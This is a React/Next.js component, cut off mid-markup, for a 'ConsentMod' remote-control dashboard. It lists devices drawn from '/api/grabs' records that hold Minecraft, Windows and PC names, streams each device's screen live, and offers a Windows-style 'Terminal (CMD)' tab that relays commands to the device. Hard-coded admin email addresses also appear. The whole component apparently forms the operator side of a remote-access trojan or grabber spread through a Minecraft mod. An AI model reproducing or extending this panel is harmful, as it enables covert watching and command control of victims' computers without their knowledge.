'use client';

import { useState, useEffect, useRef, useCallback } from 'react';
import { useRouter } from 'next/navigation';

const RTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
  ],
};

const ADMIN_EMAILS = ['lifegrading@gmail.com', 'giodewaard152@gmail.com'];

const colors = {
  bg: '#050508',
  surface: '#0f0f17',
  surfaceHover: '#171724',
  border: 'rgba(255,255,255,0.08)',
  text: '#f0f0f5',
  textDim: '#7a7a90',
  green: '#22c55e',
  greenBg: 'rgba(34, 197, 94, 0.12)',
  red: '#ef4444',
  redBg: 'rgba(239, 68, 68, 0.12)',
  blue: '#3b82f6',
  purple: '#a855f7',
  terminal: '#0d1117',
  terminalText: '#c9d1d9',
};

export default function RemoteControlStream({ initialTarget = 'consentmod', onTargetChange }) {
  const router = useRouter();

  // Target device / stream
  const [selectedTarget, setSelectedTarget] = useState(initialTarget || 'consentmod');
  const [availableDevices, setAvailableDevices] = useState([]);
  const [activeTab, setActiveTab] = useState('chat'); // 'chat' | 'terminal'

  // Stream states
  const [status, setStatus] = useState('Initializing WebRTC...');
  const [statusColor, setStatusColor] = useState('#eab308');
  const [isBroadcasting, setIsBroadcasting] = useState(false);
  const [isMuted, setIsMuted] = useState(true);
  const [isFullscreen, setIsFullscreen] = useState(false);

  // Telemetry & Stats
  const [fps, setFps] = useState(0);
  const [resolution, setResolution] = useState('Waiting...');
  const [latency, setLatency] = useState('~15ms');
  const [protocol, setProtocol] = useState('WebRTC P2P / Bridge');
  const [lastUpdate, setLastUpdate] = useState('');
  const [fallbackFrame, setFallbackFrame] = useState(null);

  // Chat & Terminal states
  const [chatMessages, setChatMessages] = useState([
    { from: 'System', text: 'Connected to ConsentMod WebRTC live stream & remote control.', time: 'Live' },
  ]);
  const [chatInput, setChatInput] = useState('');
  const [chatIndex, setChatIndex] = useState(0);
  const [terminalHistory, setTerminalHistory] = useState([
    { text: 'Microsoft Windows [Version 10.0.19045]', type: 'system' },
    { text: '(c) Microsoft Corporation. All rights reserved.', type: 'system' },
    { text: 'ConsentMod Remote Session Connected.', type: 'info' },
  ]);
  const [terminalInput, setTerminalInput] = useState('');

  // References
  const videoRef = useRef(null);
  const containerRef = useRef(null);
  const hiddenCanvasRef = useRef(null);
  const peerConnectionRef = useRef(null);
  const dataChannelRef = useRef(null);
  const broadcastStreamRef = useRef(null);
  const chatLogRef = useRef(null);
  const terminalLogRef = useRef(null);
  const candidateIndexRef = useRef(0);
  const frameCountRef = useRef(0);
  const lastFpsCalcRef = useRef(Date.now());
  const bridgeIntervalRef = useRef(null);
  const signalingIntervalRef = useRef(null);
  const peerIdRef = useRef('rc-' + Math.random().toString(36).substring(2, 9));

  // Auto-scroll chat & terminal
  useEffect(() => {
    if (chatLogRef.current) chatLogRef.current.scrollTop = chatLogRef.current.scrollHeight;
  }, [chatMessages]);

  useEffect(() => {
    if (terminalLogRef.current) terminalLogRef.current.scrollTop = terminalLogRef.current.scrollHeight;
  }, [terminalHistory]);

  // Update target when initialTarget prop changes
  useEffect(() => {
    if (initialTarget && initialTarget !== selectedTarget) {
      setSelectedTarget(initialTarget);
    }
  }, [initialTarget]);

  // Fetch available online devices periodically
  useEffect(() => {
    const fetchDevices = async () => {
      try {
        const [authRes, grabsRes, streamRes, webrtcRes] = await Promise.all([
          fetch('/api/auth/user').then((r) => r.json()).catch(() => ({ user: null })),
          fetch('/api/grabs?t=' + Date.now()).then((r) => r.json()).catch(() => ({ grabs: [] })),
          fetch('/api/stream?t=' + Date.now()).then((r) => r.json()).catch(() => ({ online: [] })),
          fetch('/api/livestream/webrtc?action=list&t=' + Date.now()).then((r) => r.json()).catch(() => ({ streams: [] })),
        ]);

        const userEmail = (authRes.user?.email || '').toLowerCase().trim();
        const isAdmin = ADMIN_EMAILS.includes(userEmail);

        const allowedUsernames = new Set();
        const grabsList = grabsRes.grabs || [];
        for (const g of grabsList) {
          if (g.minecraft_username) allowedUsernames.add(g.minecraft_username.toLowerCase().trim());
          if (g.windows_username) allowedUsernames.add(g.windows_username.toLowerCase().trim());
          if (g.pc_name && g.pc_name !== 'Unknown') allowedUsernames.add(g.pc_name.toLowerCase().trim());
          if (g.id != null) allowedUsernames.add(String(g.id).toLowerCase().trim());
        }

        const map = new Map();
        const now = Date.now();

        if (streamRes.online && Array.isArray(streamRes.online)) {
          for (const u of streamRes.online) {
            if (u.username) {
              const lower = u.username.toLowerCase().trim();
              const ts = u.timestamp || now;
              if (isAdmin || allowedUsernames.has(lower)) {
                map.set(lower, {
                  username: u.username,
                  displayName: u.username,
                  isWebRtc: false,
                  timestamp: ts,
                });
              }
            }
          }
        }

        if (webrtcRes.streams && Array.isArray(webrtcRes.streams)) {
          for (const s of webrtcRes.streams) {
            const name = s.metadata?.username || s.streamId || '';
            if (name) {
              const lower = name.toLowerCase().trim();
              const ts = s.lastSeen || now;
              if (isAdmin || allowedUsernames.has(lower)) {
                map.set(lower, {
                  username: name,
                  displayName: `${name} (WebRTC 60 FPS)`,
                  isWebRtc: true,
                  timestamp: ts,
                });
              }
            }
          }
        }

        setAvailableDevices(Array.from(map.values()));
      } catch (e) {}
    };

    fetchDevices();
    const interval = setInterval(fetchDevices, 2500);
    return () => clearInterval(interval);
  }, []);

  // Frame stats calculator
  const updateFrameStats = useCallback((w, h) => {
    frameCountRef.current++;
    const now = Date.now();
    if (now - lastFpsCalcRef.current >= 1000) {
      const calculatedFps = Math.round((frameCountRef.current * 1000) / (now - lastFpsCalcRef.current));
      setFps(calculatedFps);
      frameCountRef.current = 0;
      lastFpsCalcRef.current = now;
      if (w && h) setResolution(`${w}x${h}`);
      setLastUpdate(new Date().toLocaleTimeString());
    }
  }, []);

  // -------------------------------------------------------------
  // ConsentMod Frame Ingestion & Canvas WebRTC Stream Bridge
  // -------------------------------------------------------------
  const startCanvasBridge = useCallback(() => {
    if (bridgeIntervalRef.current) clearInterval(bridgeIntervalRef.current);

    const canvas = hiddenCanvasRef.current || document.createElement('canvas');
    canvas.width = 1280;
    canvas.height = 720;
    hiddenCanvasRef.current = canvas;
    const ctx = canvas.getContext('2d');

    const tempImg = new Image();
    tempImg.crossOrigin = 'anonymous';
    tempImg.onerror = () => {
      // Gracefully ignore frame decode / network hiccups without console error
    };

    let lastTimestamp = 0;

    let isFetching = false;

    bridgeIntervalRef.current = setInterval(async () => {
      // Don't poll frames if P2P stream is actively playing
      if (videoRef.current && videoRef.current.dataset.source === 'p2p') return;
      if (isFetching) return;

      try {
        isFetching = true;
        const targetUrl = `/api/stream?username=${encodeURIComponent(selectedTarget || 'consentmod')}&t=${Date.now()}`;

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2500);

        const res = await fetch(targetUrl, { cache: 'no-store', signal: controller.signal });
        clearTimeout(timeoutId);
        if (!res.ok) return;

        const data = await res.json();
        if (data.online && data.frame) {
          if (data.timestamp && data.timestamp <= lastTimestamp) return;
          lastTimestamp = data.timestamp || Date.now();
          tempImg.src = data.frame;
          if (videoRef.current && videoRef.current.dataset.source !== 'p2p') {
            setStatus('Live Stream Active');
            setStatusColor(colors.green);
          }
        } else {
          if (videoRef.current && videoRef.current.dataset.source !== 'p2p') {
            setStatus(`Offline (Waiting for ${selectedTarget}...)`);
            setStatusColor(colors.textDim);
            setFps(0);
            setFallbackFrame(null);
          }
        }
      } catch (e) {
      } finally {
        isFetching = false;
      }
    }, 180);

    tempImg.onload = () => {
      if (ctx && tempImg.width > 0 && tempImg.height > 0) {
        setFallbackFrame(tempImg.src);
        if (canvas.width !== tempImg.width || canvas.height !== tempImg.height) {
          canvas.width = tempImg.width;
          canvas.height = tempImg.height;
        }
        ctx.drawImage(tempImg, 0, 0, canvas.width, canvas.height);
        updateFrameStats(canvas.width, canvas.height);

        if (videoRef.current && videoRef.current.dataset.source !== 'p2p') {
          if (!videoRef.current.srcObject) {
            try {
              const stream = canvas.captureStream ? canvas.captureStream(30) : null;
              if (stream) {
                videoRef.current.srcObject = stream;
                videoRef.current.dataset.source = 'bridge';
                videoRef.current.play().catch(() => {});
              }
            } catch (err) {}
          }
          setStatus('ConsentMod WebRTC Live');
          setStatusColor(colors.green);
          setProtocol('WebRTC MediaStream (Canvas Bridge)');
        }
      }
    };

    tempImg.onerror = () => {
      if (videoRef.current && videoRef.current.dataset.source !== 'p2p') {
        setStatus('Waiting for ConsentMod Stream...');
        setStatusColor('#eab308');
      }
    };
  }, [selectedTarget, updateFrameStats]);

  // -------------------------------------------------------------
  // WebRTC P2P Signaling & Viewer Connection
  // -------------------------------------------------------------
  const initWebRTCViewer = useCallback(async () => {
    try {
      if (peerConnectionRef.current) peerConnectionRef.current.close();

      const pc = new RTCPeerConnection(RTC_CONFIG);
      peerConnectionRef.current = pc;

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          fetch('/api/livestream/webrtc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              action: 'candidate',
              streamId: selectedTarget,
              role: 'viewer',
              peerId: peerIdRef.current,
              candidate: event.candidate,
            }),
          }).catch(() => {});
        }
      };

      // ICE connection monitoring
      pc.oniceconnectionstatechange = () => {
        if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
          setStatus('WebRTC P2P Live (Direct Low Latency)');
          setStatusColor(colors.green);
          setProtocol('WebRTC P2P (Direct)');
          setLatency('< 25ms');
        } else if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
          if (videoRef.current && videoRef.current.dataset.source === 'p2p') {
            videoRef.current.dataset.source = 'bridge';
            startCanvasBridge();
          }
        }
      };

      pc.ontrack = (event) => {
        if (videoRef.current && event.streams && event.streams[0]) {
          videoRef.current.srcObject = event.streams[0];
          videoRef.current.dataset.source = 'p2p';
          videoRef.current.play().catch(() => {});
          setStatus('WebRTC P2P Live (Hardware Accelerated)');
          setStatusColor(colors.green);
          setProtocol('WebRTC P2P (Direct Low Latency)');
          setLatency('< 30ms');
        }
      };

      pc.ondatachannel = (event) => {
        const dc = event.channel;
        dataChannelRef.current = dc;
        dc.onmessage = (e) => {
          try {
            const data = JSON.parse(e.data);
            if (data.msg) {
              setChatMessages((prev) => [...prev, { from: data.from || 'Player', text: data.msg, time: 'Now' }]);
            }
          } catch (err) {
            setChatMessages((prev) => [...prev, { from: 'Player', text: e.data, time: 'Now' }]);
          }
        };
      };

      if (signalingIntervalRef.current) clearInterval(signalingIntervalRef.current);

      signalingIntervalRef.current = setInterval(async () => {
        if (isBroadcasting) return;

        try {
          const res = await fetch(
            `/api/livestream/webrtc?streamId=${encodeURIComponent(selectedTarget)}&role=viewer&peerId=${peerIdRef.current}&candidateIndex=${candidateIndexRef.current}`
          );
          if (!res.ok) return;
          const data = await res.json();

          if (data.hasBroadcaster && data.offer && pc.signalingState === 'stable') {
            await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);

            await fetch('/api/livestream/webrtc', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                action: 'answer',
                streamId: selectedTarget,
                role: 'viewer',
                peerId: peerIdRef.current,
                sdp: answer,
              }),
            });
          }

          if (data.candidates && data.candidates.length > 0) {
            candidateIndexRef.current = data.nextCandidateIndex || candidateIndexRef.current + data.candidates.length;
            for (const cand of data.candidates) {
              try {
                const c = cand && cand.candidate ? cand.candidate : cand;
                await pc.addIceCandidate(new RTCIceCandidate(c));
              } catch (e) {}
            }
          }
        } catch (err) {}
      }, 1500);
    } catch (err) {
      console.error('WebRTC viewer error:', err);
    }
  }, [selectedTarget, isBroadcasting]);

  // -------------------------------------------------------------
  // WebRTC Screen Broadcaster
  // -------------------------------------------------------------
  const startBroadcasting = async () => {
    try {
      setStatus('Requesting Screen / Game Share...');
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: { frameRate: { ideal: 60, max: 60 }, cursor: 'always' },
        audio: true,
      });

      broadcastStreamRef.current = stream;
      setIsBroadcasting(true);

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.dataset.source = 'p2p';
        videoRef.current.play().catch(() => {});
      }

      const pc = new RTCPeerConnection(RTC_CONFIG);
      peerConnectionRef.current = pc;
      stream.getTracks().forEach((track) => pc.addTrack(track, stream));

      const dc = pc.createDataChannel('consentmod-chat');
      dataChannelRef.current = dc;

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          fetch('/api/livestream/webrtc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              action: 'candidate',
              streamId: selectedTarget,
              role: 'broadcaster',
              peerId: peerIdRef.current,
              candidate: event.candidate,
            }),
          }).catch(() => {});
        }
      };

      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);

      await fetch('/api/livestream/webrtc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'offer',
          streamId: selectedTarget,
          role: 'broadcaster',
          peerId: peerIdRef.current,
          sdp: offer,
          metadata: { username: selectedTarget, fps: 60 },
        }),
      });

      setStatus('Broadcasting Live via WebRTC (60 FPS)');
      setStatusColor(colors.green);
      setProtocol('WebRTC P2P Broadcaster');

      pc.oniceconnectionstatechange = () => {
        if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
          setStatus('WebRTC P2P Broadcaster (Viewer Connected)');
          setStatusColor(colors.green);
        }
      };

      if (signalingIntervalRef.current) clearInterval(signalingIntervalRef.current);
      signalingIntervalRef.current = setInterval(async () => {
        try {
          const res = await fetch(
            `/api/livestream/webrtc?streamId=${encodeURIComponent(selectedTarget)}&role=broadcaster&peerId=${peerIdRef.current}`
          );
          if (!res.ok) return;
          const data = await res.json();
          const answer = data.answer || (data.answers && data.answers[0]?.answer);
          if (answer && pc.signalingState === 'have-local-offer') {
            await pc.setRemoteDescription(new RTCSessionDescription(answer));
          }
          if (data.candidates) {
            for (const cand of data.candidates) {
              try {
                const c = cand && cand.candidate ? cand.candidate : cand;
                await pc.addIceCandidate(new RTCIceCandidate(c));
              } catch (e) {}
            }
          }
        } catch (e) {}
      }, 1500);

      stream.getVideoTracks()[0].onended = () => {
        stopBroadcasting();
      };
    } catch (err) {
      setStatus('Broadcast canceled');
      setStatusColor(colors.red);
      setIsBroadcasting(false);
    }
  };

  const stopBroadcasting = () => {
    if (broadcastStreamRef.current) {
      broadcastStreamRef.current.getTracks().forEach((t) => t.stop());
      broadcastStreamRef.current = null;
    }
    setIsBroadcasting(false);
    fetch('/api/livestream/webrtc', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'close', streamId: selectedTarget }),
    }).catch(() => {});

    initWebRTCViewer();
    startCanvasBridge();
  };

  // -------------------------------------------------------------
  // Chat & Remote Commands
  // -------------------------------------------------------------
  useEffect(() => {
    const chatInterval = setInterval(() => {
      fetch('/api/chat/poll?index=' + chatIndex + '&role=viewer')
        .then((r) => r.json())
        .then((data) => {
          if (data.msg) {
            setChatMessages((prev) => [
              ...prev,
              { from: 'ConsentMod Player', text: data.msg, time: new Date().toLocaleTimeString() },
            ]);
            setTerminalHistory((prev) => [
              ...prev,
              { text: `< ${data.msg}`, type: 'player' },
            ]);
            setChatIndex(data.next);
          }
        })
        .catch(() => {});
    }, 900);
    return () => clearInterval(chatInterval);
  }, [chatIndex]);

  const sendChat = async (presetMsg) => {
    const textToSend = presetMsg || chatInput.trim();
    if (!textToSend) return;

    if (dataChannelRef.current && dataChannelRef.current.readyState === 'open') {
      try {
        dataChannelRef.current.send(JSON.stringify({ from: 'You', msg: textToSend }));
      } catch (e) {}
    }

    try {
      await fetch('/api/chat/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ msg: textToSend }),
      });
    } catch (e) {}

    setChatMessages((prev) => [
      ...prev,
      { from: 'You', text: textToSend, time: new Date().toLocaleTimeString() },
    ]);
    setTerminalHistory((prev) => [
      ...prev,
      { text: `> ${textToSend}`, type: 'you' },
    ]);
    if (!presetMsg) setChatInput('');
  };

  const handleTerminalSubmit = async (e) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;
    const cmd = terminalInput.trim();
    setTerminalInput('');
    await sendChat(cmd);
  };

  // Switch target handler
  const handleSelectTarget = (target) => {
    setSelectedTarget(target);
    if (onTargetChange) onTargetChange(target);
    if (videoRef.current) {
      videoRef.current.srcObject = null;
      videoRef.current.dataset.source = '';
    }
  };

  // Initialize stream hooks
  useEffect(() => {
    startCanvasBridge();
    initWebRTCViewer();

    return () => {
      if (bridgeIntervalRef.current) clearInterval(bridgeIntervalRef.current);
      if (signalingIntervalRef.current) clearInterval(signalingIntervalRef.current);
      if (peerConnectionRef.current) peerConnectionRef.current.close();
      if (broadcastStreamRef.current) {
        broadcastStreamRef.current.getTracks().forEach((t) => t.stop());
      }
    };
  }, [initWebRTCViewer, startCanvasBridge]);

  // Fullscreen toggle
  const toggleFullscreen = () => {
    if (!containerRef.current) return;
    if (!document.fullscreenElement) {
      containerRef.current.requestFullscreen().catch(() => {});
      setIsFullscreen(true);
    } else {
      document.exitFullscreen().catch(() => {});
      setIsFullscreen(false);
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      {/* Back to Devices link */}
      <div
        onClick={() => router.push('/dashboard/remote-control')}
        style={{
          cursor: 'pointer',
          color: colors.textDim,
          fontSize: 13,
          display: 'flex',
          alignItems: 'center',
          gap: 6,
          width: 'fit-content',
        }}
        onMouseEnter={(e) => (e.currentTarget.style.color = colors.text)}
        onMouseLeave={(e) => (e.currentTarget.style.color = colors.textDim)}
      >
        ← Back to Online Devices
      </div>

      {/* Top Header Card */}
      <div
        className="glass-card"
        style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          padding: '16px 20px',
          borderRadius: 14,
          background: colors.surface,
          border: `1px solid ${colors.border}`,
          flexWrap: 'wrap',
          gap: 12,
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
          <div
            style={{
              width: 12,
              height: 12,
              borderRadius: '50%',
              background: statusColor,
              boxShadow: `0 0 12px ${statusColor}`,
              animation: 'pulse 2s infinite',
            }}
          />
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <h2 style={{ margin: 0, fontSize: 18, fontWeight: 700 }}>Remote Control Livestream</h2>
              <span
                style={{
                  fontSize: 11,
                  fontWeight: 600,
                  color: colors.green,
                  background: colors.greenBg,
                  padding: '2px 8px',
                  borderRadius: 4,
                  border: '1px solid rgba(34,197,94,0.3)',
                }}
              >
                WebRTC 60 FPS
              </span>
            </div>
            <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>
              Target: <strong style={{ color: colors.text }}>{selectedTarget}</strong> • {status}
            </div>
          </div>
        </div>

        {/* Action Controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          {/* Target device selector dropdown */}
          <select
            value={selectedTarget}
            onChange={(e) => handleSelectTarget(e.target.value)}
            style={{
              background: 'rgba(255,255,255,0.06)',
              border: `1px solid ${colors.border}`,
              color: colors.text,
              borderRadius: 8,
              padding: '8px 12px',
              fontSize: 12,
              fontWeight: 600,
              outline: 'none',
              cursor: 'pointer',
            }}
          >
            {availableDevices.map((d) => (
              <option key={d.username} value={d.username} style={{ background: '#12121a', color: '#fff' }}>
                {d.displayName || d.username}
              </option>
            ))}
          </select>

          {!isBroadcasting ? (
            <button
              onClick={startBroadcasting}
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 6,
                padding: '8px 14px',
                borderRadius: 8,
                background: 'linear-gradient(135deg, #22c55e, #16a34a)',
                color: '#000',
                fontWeight: 700,
                fontSize: 12,
                border: 'none',
                cursor: 'pointer',
                boxShadow: '0 4px 12px rgba(34,197,94,0.3)',
              }}
            >
              <span>📡</span> Broadcast Screen
            </button>
          ) : (
            <button
              onClick={stopBroadcasting}
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 6,
                padding: '8px 14px',
                borderRadius: 8,
                background: colors.redBg,
                color: colors.red,
                fontWeight: 700,
                fontSize: 12,
                border: '1px solid rgba(239,68,68,0.4)',
                cursor: 'pointer',
              }}
            >
              <span>⏹</span> Stop Broadcast
            </button>
          )}

          <button
            onClick={() => {
              if (videoRef.current) {
                videoRef.current.srcObject = null;
                videoRef.current.dataset.source = '';
              }
              initWebRTCViewer();
              startCanvasBridge();
            }}
            style={{
              padding: '8px 12px',
              borderRadius: 8,
              background: 'rgba(255,255,255,0.05)',
              border: `1px solid ${colors.border}`,
              color: colors.text,
              fontSize: 12,
              cursor: 'pointer',
            }}
          >
            🔄 Reconnect
          </button>

          <a
            href="/livestream"
            target="_blank"
            rel="noopener noreferrer"
            style={{
              padding: '8px 12px',
              borderRadius: 8,
              background: 'rgba(255,255,255,0.05)',
              border: `1px solid ${colors.border}`,
              color: colors.textDim,
              fontSize: 12,
              textDecoration: 'none',
              display: 'flex',
              alignItems: 'center',
              gap: 4,
            }}
          >
            Popout Hub ↗
          </a>
        </div>
      </div>

      {/* Online Devices Quick Bar */}
      {availableDevices.length > 1 && (
        <div style={{ display: 'flex', gap: 8, overflowX: 'auto', paddingBottom: 4 }}>
          {availableDevices.map((d) => {
            const isSelected = selectedTarget.toLowerCase() === d.username.toLowerCase();
            return (
              <div
                key={d.username}
                onClick={() => handleSelectTarget(d.username)}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 8,
                  padding: '6px 12px',
                  borderRadius: 8,
                  background: isSelected ? 'rgba(34,197,94,0.15)' : colors.surface,
                  border: isSelected ? '1px solid rgba(34,197,94,0.4)' : `1px solid ${colors.border}`,
                  cursor: 'pointer',
                  fontSize: 12,
                  fontWeight: 500,
                  whiteSpace: 'nowrap',
                  color: isSelected ? colors.green : colors.text,
                }}
              >
                <img
                  src={`https://mc-heads.net/avatar/${d.username}/20`}
                  alt=""
                  style={{ width: 20, height: 20, borderRadius: 4 }}
                  onError={(e) => { e.target.style.display = 'none'; }}
                />
                <span>{d.displayName || d.username}</span>
              </div>
            );
          })}
        </div>
      )}

      {/* Main Grid: Stream on Left, Chat/Terminal on Right */}
      <div
        style={{
          display: 'grid',
          gridTemplateColumns: 'minmax(0, 1fr) 380px',
          gap: 16,
          alignItems: 'start',
        }}
      >
        {/* Stream Column */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <div
            ref={containerRef}
            style={{
              position: 'relative',
              background: '#040406',
              borderRadius: 14,
              overflow: 'hidden',
              border: `1px solid ${colors.border}`,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              minHeight: 480,
              boxShadow: '0 8px 32px rgba(0,0,0,0.6)',
            }}
          >
            {/* Direct High-Quality Live Image Stream */}
            {fallbackFrame && (
              <img
                src={fallbackFrame}
                alt="Live Frame"
                style={{
                  position: 'absolute',
                  inset: 0,
                  width: '100%',
                  height: '100%',
                  objectFit: 'contain',
                  zIndex: 2,
                }}
              />
            )}

            {/* HTML5 WebRTC Video Player (shown when P2P is active) */}
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted={isMuted}
              style={{
                width: '100%',
                height: '100%',
                maxHeight: '68vh',
                objectFit: 'contain',
                display: videoRef.current && videoRef.current.dataset.source === 'p2p' ? 'block' : (!fallbackFrame ? 'block' : 'none'),
                position: 'relative',
                zIndex: 1,
              }}
            />

            {/* Top Overlay Badges */}
            <div
              style={{
                position: 'absolute',
                top: 12,
                left: 12,
                display: 'flex',
                alignItems: 'center',
                gap: 8,
                background: 'rgba(10,10,16,0.75)',
                backdropFilter: 'blur(8px)',
                padding: '6px 12px',
                borderRadius: 8,
                border: '1px solid rgba(255,255,255,0.1)',
                fontSize: 12,
              }}
            >
              <span
                style={{
                  width: 8,
                  height: 8,
                  borderRadius: '50%',
                  background: colors.green,
                  boxShadow: `0 0 8px ${colors.green}`,
                }}
              />
              <span style={{ fontWeight: 600 }}>LIVE</span>
              <span style={{ color: colors.textDim }}>•</span>
              <span style={{ color: colors.textDim }}>{fps} FPS</span>
              <span style={{ color: colors.textDim }}>•</span>
              <span style={{ color: colors.textDim }}>{resolution}</span>
            </div>

            {/* Bottom Overlay Controls */}
            <div
              style={{
                position: 'absolute',
                bottom: 12,
                right: 12,
                display: 'flex',
                gap: 8,
                background: 'rgba(10,10,16,0.75)',
                backdropFilter: 'blur(8px)',
                padding: '6px 10px',
                borderRadius: 8,
                border: '1px solid rgba(255,255,255,0.1)',
              }}
            >
              <button
                onClick={() => setIsMuted(!isMuted)}
                title={isMuted ? 'Unmute Audio' : 'Mute Audio'}
                style={{ background: 'none', border: 'none', color: colors.text, cursor: 'pointer', fontSize: 14, padding: 4 }}
              >
                {isMuted ? '🔇' : '🔊'}
              </button>
              <button
                onClick={toggleFullscreen}
                title="Fullscreen"
                style={{ background: 'none', border: 'none', color: colors.text, cursor: 'pointer', fontSize: 14, padding: 4 }}
              >
                ⛶
              </button>
            </div>
          </div>

          {/* Telemetry Strip */}
          <div
            style={{
              display: 'grid',
              gridTemplateColumns: 'repeat(4, 1fr)',
              gap: 10,
              padding: '12px 16px',
              background: colors.surface,
              borderRadius: 10,
              border: `1px solid ${colors.border}`,
              fontSize: 12,
            }}
          >
            <div>
              <div style={{ color: colors.textDim, marginBottom: 2 }}>PROTOCOL</div>
              <div style={{ fontWeight: 600, color: colors.green }}>{protocol}</div>
            </div>
            <div>
              <div style={{ color: colors.textDim, marginBottom: 2 }}>EST. LATENCY</div>
              <div style={{ fontWeight: 600 }}>{latency}</div>
            </div>
            <div>
              <div style={{ color: colors.textDim, marginBottom: 2 }}>REFRESH & FPS</div>
              <div style={{ fontWeight: 600 }}>{resolution} @ {fps} fps</div>
            </div>
            <div>
              <div style={{ color: colors.textDim, marginBottom: 2 }}>LAST FRAME</div>
              <div style={{ fontWeight: 600 }}>{lastUpdate || 'Active'}</div>
            </div>
          </div>
        </div>

        {/* Right Console: Chat & Terminal Tabs */}
        <div
          style={{
            display: 'flex',
            flexDirection: 'column',
            background: colors.surface,
            borderRadius: 14,
            border: `1px solid ${colors.border}`,
            overflow: 'hidden',
            height: '100%',
            minHeight: 560,
          }}
        >
          {/* Tab Bar */}
          <div
            style={{
              display: 'flex',
              borderBottom: `1px solid ${colors.border}`,
              background: 'rgba(0,0,0,0.2)',
            }}
          >
            <div
              onClick={() => setActiveTab('chat')}
              style={{
                flex: 1,
                padding: '12px 14px',
                textAlign: 'center',
                fontSize: 13,
                fontWeight: 600,
                cursor: 'pointer',
                color: activeTab === 'chat' ? colors.green : colors.textDim,
                borderBottom: activeTab === 'chat' ? `2px solid ${colors.green}` : '2px solid transparent',
              }}
            >
              💬 ConsentMod Chat
            </div>
            <div
              onClick={() => setActiveTab('terminal')}
              style={{
                flex: 1,
                padding: '12px 14px',
                textAlign: 'center',
                fontSize: 13,
                fontWeight: 600,
                cursor: 'pointer',
                color: activeTab === 'terminal' ? colors.green : colors.textDim,
                borderBottom: activeTab === 'terminal' ? `2px solid ${colors.green}` : '2px solid transparent',
              }}
            >
              🖥 Terminal (CMD)
            </div>
          </div>

          {activeTab === 'chat' ? (
            <>
              {/* Quick Minecraft Command Shortcuts */}
              <div
                style={{
                  padding: '8px 12px',
                  background: 'rgba(255,255,255,0.02)',
                  borderBottom: `1px solid ${colors.border}`,
                  display: 'flex',
                  gap: 6,
                  flexWrap: 'wrap',
                }}
              >
                <button
                  onClick={() => sendChat('/say Hello from Remote Control!')}
                  style={{
                    fontSize: 11,
                    padding: '3px 8px',
                    borderRadius: 5,
                    background: 'rgba(255,255,255,0.05)',
                    border: `1px solid ${colors.border}`,
                    color: colors.text,
                    cursor: 'pointer',
                  }}
                >
                  /say 👋
                </button>
                <button
                  onClick={() => sendChat('/time set day')}
                  style={{
                    fontSize: 11,
                    padding: '3px 8px',
                    borderRadius: 5,
                    background: 'rgba(255,255,255,0.05)',
                    border: `1px solid ${colors.border}`,
                    color: colors.text,
                    cursor: 'pointer',
                  }}
                >
                  /time day ☀️
                </button>
                <button
                  onClick={() => sendChat('/weather clear')}
                  style={{
                    fontSize: 11,
                    padding: '3px 8px',
                    borderRadius: 5,
                    background: 'rgba(255,255,255,0.05)',
                    border: `1px solid ${colors.border}`,
                    color: colors.text,
                    cursor: 'pointer',
                  }}
                >
                  /weather clear 🌤
                </button>
                <button
                  onClick={() => sendChat('/gamemode spectator')}
                  style={{
                    fontSize: 11,
                    padding: '3px 8px',
                    borderRadius: 5,
                    background: 'rgba(255,255,255,0.05)',
                    border: `1px solid ${colors.border}`,
                    color: colors.text,
                    cursor: 'pointer',
                  }}
                >
                  /spectator 👁
                </button>
              </div>

              {/* Chat Log */}
              <div
                ref={chatLogRef}
                style={{
                  flex: 1,
                  padding: 12,
                  overflowY: 'auto',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: 8,
                  fontSize: 13,
                }}
              >
                {chatMessages.map((m, i) => (
                  <div
                    key={i}
                    style={{
                      padding: '8px 12px',
                      borderRadius: 8,
                      background: m.from === 'You' ? 'rgba(34,197,94,0.08)' : 'rgba(255,255,255,0.03)',
                      border: `1px solid ${m.from === 'You' ? 'rgba(34,197,94,0.2)' : 'rgba(255,255,255,0.04)'}`,
                      lineHeight: 1.4,
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 2 }}>
                      <span
                        style={{
                          fontWeight: 700,
                          color: m.from === 'You' ? colors.green : colors.blue,
                          fontSize: 12,
                        }}
                      >
                        {m.from}
                      </span>
                      <span style={{ fontSize: 10, color: colors.textDim }}>{m.time || ''}</span>
                    </div>
